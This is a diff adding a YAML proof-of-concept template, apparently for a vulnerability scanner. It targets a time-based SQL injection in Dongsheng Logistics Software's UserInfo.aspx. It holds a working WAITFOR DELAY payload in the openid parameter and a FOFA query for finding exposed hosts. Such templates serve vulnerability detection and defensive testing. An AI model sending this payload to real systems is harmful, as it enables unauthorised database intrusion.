@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-userinfo-aspx-sqli
+info:
+  name: 东胜物流软件 UserInfo.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"您已关联系统账户") && contains(body,"审批确认")
+    && contains(body,"确定要解除系统关联") && duration >= t1 && duration <= t2
+transport: http
